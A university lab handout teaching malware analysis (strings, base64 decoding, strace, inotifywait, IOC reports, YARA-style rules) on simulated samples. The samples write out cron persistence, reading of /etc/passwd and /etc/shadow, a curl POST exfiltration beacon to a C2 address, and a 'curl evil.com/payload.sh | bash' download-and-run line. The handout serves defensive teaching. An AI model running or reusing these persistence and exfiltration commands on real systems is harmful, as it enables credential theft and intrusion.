---
title: "Lab 10 — Malware Analysis: Static & Dynamic Techniques"
course: SCIA-472
week: 11
difficulty: "⭐⭐⭐"
estimated_time: "75–90 min"
tags:
  - malware-analysis
  - static-analysis
  - dynamic-analysis
  - ioc-extraction
  - yara
  - strace
---

# Lab 10 — Malware Analysis: Static & Dynamic Techniques

| Field | Value |
|---|---|
| **Course** | SCIA-472 — Ethical Hacking & Penetration Testing |
| **Week** | 11 |
| **Difficulty** | ⭐⭐⭐ |
| **Estimated Time** | 75–90 minutes |
| **Prerequisites** | Labs 01–09 completed; Docker running |

## Overview

Malware analysts reverse engineer malicious code to understand its behavior, extract indicators of compromise (IOCs), and build detection signatures. This lab uses **static analysis** (`file`, `strings`, `objdump`) and **dynamic analysis** (`strace`, `inotifywait`) on safe simulated malware samples.

This lab covers:

- File type identification and binary header inspection
- String extraction to identify embedded IOCs
- Base64 obfuscation detection and decoding
- System call tracing with `strace`
- Filesystem monitoring with `inotifywait`
- IOC extraction and YARA-style pattern matching

---

!!! warning "Ethical Use — Read Before Proceeding"
    This lab simulates malware behavior using **benign scripts**. Never analyze real malware on unprotected systems. Always use isolated, no-network sandboxes for real malware analysis. Executing unknown malware samples outside a dedicated VM risks compromising your host system.

---

## Part 1 — Static Analysis

Static analysis examines a file without executing it. The goal is to extract as much information as possible — file type, embedded strings, imports, and obfuscated content — before running anything.

### Step 1.1 — File Type Identification

The `file` command reads magic bytes (file headers) rather than trusting extensions, making it a reliable first step when a file's true type is unknown.

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq binutils file python3 2>/dev/null

# Create sample files to analyze
printf '#!/bin/bash\necho hello\n' > /tmp/script.sh
python3 -c \"print('Hello')\" > /tmp/script.py
printf 'MZ\x90\x00\x03\x00' > /tmp/fake_pe.exe
python3 -c \"import base64; open('/tmp/encoded.txt','wb').write(base64.b64encode(b'malicious code'))\"

echo '=== File type identification ==='
for f in /tmp/script.sh /tmp/script.py /tmp/fake_pe.exe /tmp/encoded.txt; do
  echo -n \"\$f: \"
  file \$f
done"
```

!!! success "Expected Output"
    - `script.sh` → Bourne-Again shell script
    - `script.py` → Python script
    - `fake_pe.exe` → MS-DOS executable (PE header `MZ` magic bytes)
    - `encoded.txt` → ASCII text (base64 data looks like plain text)

📸 **Screenshot checkpoint 10a** — Capture the full file type identification output for all four samples.

---

### Step 1.2 — Strings Extraction

The `strings` command extracts printable character sequences from any file, often revealing C2 IP addresses, file paths, registry keys, and other IOCs embedded in a binary.

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq binutils 2>/dev/null

# Simulate malware binary with embedded strings
cat > /tmp/fake_malware.sh << 'SCRIPT'
#!/bin/bash
# Obfuscated variable names
C2_SERVER='185.220.101.45'
C2_PORT='4444'
BEACON_INTERVAL=60
SECRET_KEY='base64_encoded_key_abc123'

# Persistence
mkdir -p /tmp/.config/systemd/user
cp \$0 /tmp/.config/systemd/user/system-monitor
echo '*/5 * * * * /tmp/.config/systemd/user/system-monitor' | crontab -

# Data collection
hostname > /tmp/.config/victim_info.txt
whoami >> /tmp/.config/victim_info.txt
uname -a >> /tmp/.config/victim_info.txt
cat /etc/passwd >> /tmp/.config/victim_info.txt

# C2 beacon (simulated)
curl -s -X POST http://\$C2_SERVER:\$C2_PORT/beacon -d @/tmp/.config/victim_info.txt 2>/dev/null
SCRIPT
chmod +x /tmp/fake_malware.sh

echo '=== Strings analysis of simulated malware ==='
strings /tmp/fake_malware.sh"
```

!!! success "Expected Output"
    `strings` reveals the C2 server IP `185.220.101.45`, port `4444`, cron persistence pattern `*/5 * * * *`, and the data collection targets (`/etc/passwd`, `hostname`, `whoami`).

📸 **Screenshot checkpoint 10b** — Capture the strings output showing the C2 IP, port, cron entry, and data collection targets.

---

### Step 1.3 — Identify Base64 Encoding

Base64 encoding is one of the simplest obfuscation techniques. It hides the actual payload content but is trivially decoded. Analysts must recognize encoded content and decode it immediately.

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq python3 2>/dev/null

# Simulated obfuscated payload
OBFUSCATED=\$(python3 -c \"import base64; print(base64.b64encode(b'#!/bin/bash\nrm -rf /tmp/data\ncurl evil.com/payload.sh | bash').decode())\")
echo '=== Obfuscated payload (as attacker delivers it) ==='
echo \"\$OBFUSCATED\"
echo ''
echo '=== Decoded payload (what it actually does) ==='
echo \"\$OBFUSCATED\" | base64 -d"
```

!!! success "Expected Output"
    The base64 string decodes to a destructive payload that deletes data and downloads a secondary payload from `evil.com`. The obfuscation provides zero real protection.

📸 **Screenshot checkpoint 10c** — Capture both the encoded string and the decoded payload.

---

## Part 2 — Dynamic Analysis

Dynamic analysis executes the sample in a controlled environment and monitors its behavior: what files it opens, what network connections it makes, and what system calls it invokes.

### Step 2.1 — strace System Call Analysis

`strace` intercepts and records every system call the traced process makes, providing a low-level view of program behavior that cannot be hidden by obfuscation.

```bash
docker run --rm --cap-add SYS_PTRACE --security-opt seccomp=unconfined ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq strace 2>/dev/null

cat > /tmp/suspicious.sh << 'SCRIPT'
#!/bin/bash
cat /etc/passwd > /tmp/stolen_passwd.txt
cat /etc/shadow > /tmp/stolen_shadow.txt 2>/dev/null || true
hostname >> /tmp/stolen_passwd.txt
SCRIPT
chmod +x /tmp/suspicious.sh

echo '=== Tracing file access via strace ==='
strace -e trace=openat,read,write /tmp/suspicious.sh 2>&1 | grep -E 'openat.*etc|openat.*stolen|write' | head -15"
```

!!! success "Expected Output"
    `openat()` calls show `/etc/passwd` and `/etc/shadow` being opened for reading. `write()` calls show data being written to `/tmp/stolen_passwd.txt`. This is definitive evidence of credential theft behavior.

📸 **Screenshot checkpoint 10d** — Capture the strace output showing `openat(/etc/passwd)` and the write operations to stolen files.

---

### Step 2.2 — inotifywait Filesystem Monitoring

`inotifywait` monitors filesystem events in real-time. In a sandbox, this provides visibility into every file a malware sample touches without requiring kernel-level instrumentation.

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq inotify-tools 2>/dev/null

inotifywait -m /etc /tmp -e access,create,modify,delete \
  --format '%T %e %w%f' --timefmt '%H:%M:%S' 2>/dev/null &
MON=\$!
sleep 0.5

# Run simulated malware
cat /etc/passwd > /dev/null
cat /etc/shadow > /dev/null 2>&1 || true
echo 'collected_data' > /tmp/.hidden_exfil.txt
chmod +x /tmp/.hidden_exfil.txt

sleep 1
kill \$MON 2>/dev/null

echo ''
echo '=== Files created by malware ==='
ls -la /tmp/.hidden_exfil.txt"
```

!!! note "What to Observe"
    `inotifywait` logs each filesystem event with a timestamp. Look for `ACCESS` events on `/etc/passwd` and `/etc/shadow`, then `CREATE` and `MODIFY` events as the exfiltration staging file is written.

📸 **Screenshot checkpoint 10e** — Capture the inotifywait event log and the final file listing showing `.hidden_exfil.txt`.

---

## Part 3 — IOC Extraction

After analysis, all indicators are compiled into a structured IOC report that can be shared with threat intelligence platforms, fed into SIEM rules, or used to create detection signatures.

### Step 3.1 — Build an IOC Report

```bash
docker run --rm python:3.11-slim python3 -c "
iocs = {
    'Network IOCs': [
        ('IP',     '185.220.101.45',        'C2 server IP - check threat intel'),
        ('Port',   '4444',                  'Common Metasploit reverse shell port'),
        ('Domain', 'evil.com',              'Payload delivery domain'),
        ('URL',    'evil.com/payload.sh',   'Remote script download'),
    ],
    'File IOCs': [
        ('Path',  '/tmp/.config/',                         'Hidden config directory in /tmp'),
        ('File',  '/tmp/.config/system-monitor',           'Persistence binary masquerading as system tool'),
        ('File',  '/tmp/.config/victim_info.txt',          'Exfiltration staging file'),
        ('Hash',  'md5sum of malware.sh',                  'File hash for AV signatures'),
    ],
    'Behavioral IOCs': [
        ('Cron',  '*/5 * * * *',            'Frequent cron execution (every 5 min)'),
        ('Files', 'cat /etc/passwd',         'Credential reconnaissance'),
        ('Net',   'curl -X POST to C2',     'Data exfiltration via HTTP POST'),
        ('Evade', 'Hidden dir in /tmp',     'Defense evasion via hidden directory'),
    ],
}
for category, items in iocs.items():
    print(f'=== {category} ===')
    for itype, value, desc in items:
        print(f'  [{itype}] {value}')
        print(f'         {desc}')
    print()
"
```

📸 **Screenshot checkpoint 10f** — Capture the full IOC report showing all three categories.

---

### Step 3.2 — YARA-Style Pattern Matching

YARA rules define patterns that match malware families based on strings, byte sequences, or behavioral indicators. This simulates how antivirus engines and EDR tools perform detection without needing a known hash.

```bash
docker run --rm python:3.11-slim python3 -c "
import re

# Simulated YARA-like detection
rules = [
    ('C2_IP',     r'185\.220\.101\.[0-9]+',        'Known Tor exit node / C2 IP range'),
    ('CURL_POST', r'curl.*-X POST',                 'Exfiltration via curl POST'),
    ('CRONTAB',   r'crontab',                       'Persistence via cron'),
    ('BASE64',    r'base64_encoded|echo.*base64',   'Base64 obfuscation'),
    ('HIDDEN_DIR',r'/tmp/\.',                       'Hidden directory in /tmp'),
]

sample = '''#!/bin/bash
C2_SERVER=185.220.101.45
curl -s -X POST http://\$C2_SERVER:4444/beacon
(crontab -l; echo \"* * * * * /tmp/.config/beacon\") | crontab -
SECRET=\$(echo base64_encoded_payload)
'''

print('=== YARA-STYLE PATTERN MATCHING ===')
print(f'Scanning {len(sample)} bytes...')
print()
matches = []
for rule_name, pattern, description in rules:
    if re.search(pattern, sample):
        matches.append((rule_name, description))
        print(f'MATCH: {rule_name}')
        print(f'       {description}')
print()
print(f'Detection: {len(matches)}/{len(rules)} rules matched')
print('Verdict: MALICIOUS' if len(matches) >= 2 else 'SUSPICIOUS')
"
```

!!! success "Expected Output"
    Multiple rules match: `C2_IP`, `CURL_POST`, `CRONTAB`, `BASE64`, and `HIDDEN_DIR`. Verdict: **MALICIOUS**.

📸 **Screenshot checkpoint 10g** — Capture the pattern matching output showing all rule hits and the final verdict.

---

## Cleanup

```bash
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all seven screenshots with your lab report. Label each with the checkpoint ID.

| # | Screenshot ID | Required Content |
|---|---|---|
| 1 | **10a** | File type identification — all four sample files correctly identified |
| 2 | **10b** | Strings output — C2 IP, port, cron entry, and data collection targets visible |
| 3 | **10c** | Base64 obfuscation — encoded string and decoded destructive payload |
| 4 | **10d** | strace output — `openat(/etc/passwd)` and write operations visible |
| 5 | **10e** | inotifywait event log — access events on `/etc` files and creation of exfil file |
| 6 | **10f** | IOC report — network, file, and behavioral categories complete |
| 7 | **10g** | Pattern matching — all rule hits displayed, MALICIOUS verdict |

---

## IOC Extraction Report

Include in your lab submission a structured IOC table in this format:

| IOC Type | Value | Source | Confidence | Action |
|---|---|---|---|---|
| IP | 185.220.101.45 | strings, strace | High | Block at firewall; submit to threat intel |
| Port | 4444/TCP | strings | Medium | Alert on outbound connections |
| Domain | evil.com | strings | High | DNS sinkhole; block at proxy |
| File Path | `/tmp/.config/` | strace, inotifywait | High | File integrity monitoring rule |
| File Hash | `<md5sum output>` | static | High | AV signature |
| Behavior | `crontab` write + POST to C2 | behavioral | High | SIEM correlation rule |

---

## Reflection Questions

Answer each question in **150–200 words** in your lab report.

!!! question "Reflection 1 — String Obfuscation"
    The `strings` command revealed the C2 server IP `185.220.101.45` embedded in the malware. Real malware obfuscates strings to evade this. Name **three obfuscation techniques** malware authors use to hide IOCs from static analysis.

!!! question "Reflection 2 — Behavioral Baseline"
    `strace` showed `openat('/etc/passwd')` and `openat('/etc/shadow')` system calls. If you were a SIEM analyst seeing these calls originating from a web server process, what would you conclude? What is the principle of **normal behavior baseline** and why does it enable anomaly detection?

!!! question "Reflection 3 — IOC Longevity"
    You extracted several IOC types: IP address, domain, file path, and behavioral patterns. Which type of IOC has the **longest shelf life** (stays valid the longest)? Which **changes most rapidly**? (Hint: think about how easy each is for attackers to change between campaigns.)

!!! question "Reflection 4 — Behavioral vs. Hash Detection"
    YARA rules are used by antivirus and EDR tools to detect malware. The rule matched based on patterns in the code, not by knowing the specific malware family. Why are **behavioral indicators** (like "reads `/etc/passwd` then sends POST request") more durable than **hash-based detection**?

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (7 × ~6 pts each) | 40 pts |
    | IOC extraction report (complete, structured, all types covered) | 20 pts |
    | Reflection questions (4 × 10 pts each) | 40 pts |
    | **Total** | **100 pts** |
